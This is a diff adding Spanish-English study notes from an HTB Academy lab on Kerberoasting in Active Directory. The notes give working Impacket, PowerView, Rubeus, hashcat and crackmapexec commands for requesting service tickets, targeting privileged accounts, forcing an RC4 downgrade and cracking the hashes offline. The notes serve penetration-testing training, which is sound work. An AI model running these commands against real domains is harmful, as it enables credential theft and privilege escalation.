@@ -991,3 +991,125 @@ Our enumeration up to this point has given us a broad picture of the domain and 
 
 > This attack targets Service Principal Names (SPN) accounts. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running.
 
+
+Para resumir este ataque se basa en identificar los SPN ( service principal names. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running). Obtienes el hash de tipo TGS-REP y procedes a intentar crackearlos aveces esas cuentas son  priviligeadas o pertenecen a grupos priviligeados.
+
+```
+GetUserSPNs.py (Impacket)
+### List all SPN
+
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
+
+### Request all the tickets
+
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
+
+### Target a single ticket and save the output
+
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile hash_output.txt
+
+### Crack Hashcat
+
+hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
+
+### Testing Authentication against a Domain Controller
+
+sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
+
+```
+
+## Kerberoasting - from Windows ( algunos conceptos clave)
+
+Existe una manera manual de realizar este proceso pero la verdad no veo util aprender esto ya que tenemos tools como Rubeus que nos permite hacer esto autmatico. ( no por ahora). Desde PowerViewww:
+
+```
+Import-Module .\PowerView.ps1
+# Obtener toda la lista de SPNs
+Get-DomainUser * -spn | select samaccountname
+```
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/22d8c787-f0a6-465b-bddb-602ef299bdae)
+
+Get especific tarjet
+
+```
+Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+# Para guardarlos
+
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
+
+```
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/53abe7b6-56b1-4105-b311-017761c363ad)
+
+### Using Rubeus
+
+Esta es una de las maneras mas faciles ya que automatiza el proceso. Esta herramienta tiene infinidad de opciones poco a poco espero aprender mas
+
+```
+Rubeus.exe kerberoast /stats
+
+```
+> Let's use Rubeus to request tickets for accounts with the admincount attribute set to 1. These would likely be high-value targets and worth our initial focus for offline cracking efforts with Hashcat. Be sure to specify the /nowrap flag so that the hash can be more easily copied down for offline cracking using Hashcat.
+
+Listar las cuenta que pueden ser de administrador¿?
+
+```
+.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+```
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/140d07f5-63de-4c7a-8eb2-64a4ef32d333)
+
+
+
+> Indica que un objeto determinado ha cambiado sus ACL a un valor más seguro por el sistema porque era miembro de uno de los grupos administrativos (directamente o transitivamente).
+
+> Usemos Rubeus para solicitar tickets para cuentas con el admincountatributo establecido en 1. Estos probablemente serían objetivos de alto valor y valdrían la pena centrarnos inicialmente en los esfuerzos de craqueo fuera de línea con Hashcat. Asegúrese de especificar la /nowrapbandera para que el hash se pueda copiar más fácilmente para descifrarlo sin conexión usando Hashcat. Según la documentación, el indicador "/nowrap" evita que cualquier blob de ticket base64 se ajuste en columnas para cualquier función"; por lo tanto, no tendremos que preocuparnos por recortar espacios en blanco o nuevas líneas antes de descifrar con Hashcat.
+
+```
+ .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+```
+
+### A Note on Encryption Types
+
+Kerberoasting tools typically request RC4 encryption when performing the attack and initiating TGS-REQ requests. This is because RC4 is weaker and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256. Que aclaro segun lo que tengo entendido Impacket deberia de ser compatible con todos los tickets incluidos los de AES.
+
+#### AES 256, AES 128 y RC4
+
+When performing Kerberoasting in most environments, we will retrieve hashes that begin with $krb5tgs$23$*, an RC4 (type 23) encrypted ticket.
+
+> Sometimes we will receive an AES-256 (type 18) encrypted hash or hash that begins with $krb5tgs$18$*. While it is possible to crack AES-128 (type 17) and AES-256 (type 18) TGS tickets using Hashcat, it will typically be significantly more time consuming than cracking an RC4 (type 23) encrypted ticket, but still possible especially if a weak password is chosen. Let's walk through an example.
+
+Te puedes dar cuenta entonces que tipos de hashes son dependiendo del numero.
+
+```
+.\Rubeus.exe kerberoast /user:testspn /nowrap
+
+```
+
+###  msDS-SupportedEncryptionTypes
+
+Checking with PowerView, we can see that the msDS-SupportedEncryptionTypes attribute is set to 0. The chart here tells us that a decimal value of 0 means that a specific encryption type is not defined and set to the default of RC4_HMAC_MD5. Existe una tabla donde dependiendo del valor es el tipo de encryptacion.
+
+> https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797
+
+
+Para crackear estos hashes mas seguros
+
+> To run this through Hashcat, we need to use hash mode 19700, which is Kerberos 5, etype 18, TGS-REP (AES256-CTS-HMAC-SHA1-96)
+
+Podemos usar Rubeus con la /tgtdeleg para especificar que solo queremos cifrado RC4 al solicitar un nuevo ticket de servicio. La herramienta hace esto especificando el cifrado RC4 como el único algoritmo que admitimos en el cuerpo de la solicitud TGS. Esto puede ser un mecanismo de seguridad integrado en Active Directory para lograr compatibilidad con versiones anteriores. Al usar esta bandera, podemos solicitar un ticket cifrado RC4 (tipo 23) que se puede descifrar mucho más rápido.
+
+> En la imagen de arriba, podemos ver que al proporcionar la /tgtdelegbandera, la herramienta solicitó un ticket RC4 a pesar de que los tipos de cifrado admitidos figuran como AES 128/256. Este sencillo ejemplo muestra la importancia de una enumeración detallada y de profundizar más al realizar ataques como Kerberoasting. Aquí podríamos bajar de AES a RC4 y reducir el tiempo de descifrado en más de 4 minutos y 30 segundos.
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/0baf965d-7a06-4319-a59d-268b33f99e28)
+
+### ¿Donde no funciona esta flag?
+
+> Nota: Esto no funciona con un controlador de dominio de Windows Server 2019, independientemente del nivel funcional del dominio. Siempre devolverá un ticket de servicio cifrado con el nivel más alto de cifrado admitido por la cuenta de destino. Dicho esto, si nos encontramos en un dominio con controladores de dominio ejecutándose en Server 2016 o anterior (lo cual es bastante común), habilitar AES no mitigará parcialmente el Kerberoasting al devolver solo tickets cifrados AES, que son mucho más difíciles de descifrar, pero más bien permitirá que un atacante solicite un ticket de servicio cifrado RC4. En los DC de Windows Server 2019, habilitar el cifrado AES en una cuenta SPN dará como resultado que recibamos un ticket de servicio AES-256 (tipo 18), que es sustancialmente más difícil (pero no imposible) de descifrar, especialmente si se utiliza una contraseña de diccionario relativamente débil. en uso.
+
+
+
+
+
+
